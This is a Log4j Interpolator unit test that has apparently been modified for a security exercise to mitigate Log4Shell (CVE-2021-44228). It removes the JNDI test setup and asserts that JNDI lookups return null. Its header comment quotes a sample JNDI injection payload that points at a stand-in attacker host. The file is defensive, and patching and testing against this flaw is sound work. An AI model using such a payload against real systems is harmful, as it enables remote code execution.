/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements. See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache license, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License. You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the license for the specific language governing permissions and
 * limitations under the license.
 */
package org.apache.logging.log4j.core.lookup;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import org.apache.logging.log4j.ThreadContext;
// Removed JndiRule import to mitigate VULNERABILITY-EXERCISE-001 (JNDI injection vulnerability)
// import org.apache.logging.log4j.junit.JndiRule;
import org.junit.ClassRule;
import org.junit.Test;
import org.junit.rules.ExternalResource;
import org.junit.rules.RuleChain;

import static org.junit.Assert.*;

/**
 * Test class for the Interpolator lookup functionality.
 * 
 * SECURITY NOTICE: This test class has been modified to mitigate VULNERABILITY-EXERCISE-001,
 * which corresponds to the Log4Shell vulnerability (CVE-2021-44228). JNDI lookup functionality
 * has been intentionally disabled to prevent remote code execution attacks through malicious
 * JNDI lookup patterns like ${jndi:ldap://attacker.com/exploit}.
 * 
 * Changes made for security:
 * - Removed JndiRule import and usage from test setup
 * - Modified JNDI lookup assertions to expect null returns
 * - Added security comments throughout to document the intentional removal
 * - Preserved all other lookup mechanisms (sys:, ctx:, env:, date:, java:) to ensure functionality
 */
public class InterpolatorTest {

    private static final String TESTKEY = "TestKey";
    private static final String TESTKEY2 = "TestKey2";
    private static final String TESTVAL = "TestValue";

    private static final String TEST_CONTEXT_RESOURCE_NAME = "logging/context-name";
    private static final String TEST_CONTEXT_NAME = "app-1";

    @ClassRule
    public static RuleChain rules = RuleChain.outerRule(new ExternalResource() {
        @Override
        protected void before() throws Throwable {
            System.setProperty(TESTKEY, TESTVAL);
            System.setProperty(TESTKEY2, TESTVAL);
        }

        @Override
        protected void after() {
            System.clearProperty(TESTKEY);
            System.clearProperty(TESTKEY2);
        }
    });
    // Removed JndiRule to mitigate VULNERABILITY-EXERCISE-001 (JNDI injection vulnerability)
    // JNDI lookup functionality has been intentionally disabled for security reasons
    // }).around(new JndiRule(
    //     "java:comp/env/" + TEST_CONTEXT_RESOURCE_NAME, TEST_CONTEXT_NAME));

    // SECURITY NOTE: JndiLookup.CONTAINER_JNDI_RESOURCE_PATH_PREFIX constant was removed 
    // as part of CVE-2021-44228 (Log4Shell) mitigation. Using hardcoded value for test.

    @Test
    public void testLookup() {
        final Map<String, String> map = new HashMap<>();
        map.put(TESTKEY, TESTVAL);
        final StrLookup lookup = new Interpolator(new MapLookup(map));
        ThreadContext.put(TESTKEY, TESTVAL);
        String value = lookup.lookup(TESTKEY);
        assertEquals(TESTVAL, value);
        value = lookup.lookup("ctx:" + TESTKEY);
        assertEquals(TESTVAL, value);
        value = lookup.lookup("sys:" + TESTKEY);
        assertEquals(TESTVAL, value);
        value = lookup.lookup("SYS:" + TESTKEY2);
        assertEquals(TESTVAL, value);
        value = lookup.lookup("BadKey");
        assertNull(value);
        ThreadContext.clearMap();
        value = lookup.lookup("ctx:" + TESTKEY);
        assertEquals(TESTVAL, value);
        // SECURITY: JNDI lookup functionality removed to mitigate VULNERABILITY-EXERCISE-001 (CVE-2021-44228)
        // JNDI lookups now return null to prevent remote code execution attacks
        value = lookup.lookup("jndi:" + TEST_CONTEXT_RESOURCE_NAME);
        assertNull("JNDI lookups should return null for security", value);
    }

    private void assertLookupNotEmpty(final StrLookup lookup, final String key) {
        final String value = lookup.lookup(key);
        assertNotNull(value);
        assertFalse(value.isEmpty());
        System.out.println(key + " = " + value);
    }

    @Test
    public void testLookupWithDefaultInterpolator() {
        final StrLookup lookup = new Interpolator();
        String value = lookup.lookup("sys:" + TESTKEY);
        assertEquals(TESTVAL, value);
        value = lookup.lookup("env:PATH");
        assertNotNull(value);
        // SECURITY: JNDI lookup functionality removed to mitigate VULNERABILITY-EXERCISE-001 (CVE-2021-44228)
        // JNDI lookups now return null to prevent remote code execution attacks
        value = lookup.lookup("jndi:" + TEST_CONTEXT_RESOURCE_NAME);
        assertNull("JNDI lookups should return null for security", value);
        value = lookup.lookup("date:yyyy-MM-dd");
        assertNotNull("No Date", value);
        final SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd");
        final String today = format.format(new Date());
        assertEquals(value, today);
        assertLookupNotEmpty(lookup, "java:version");
        assertLookupNotEmpty(lookup, "java:runtime");
        assertLookupNotEmpty(lookup, "java:vm");
        assertLookupNotEmpty(lookup, "java:os");
        assertLookupNotEmpty(lookup, "java:locale");
        assertLookupNotEmpty(lookup, "java:hw");
    }
}
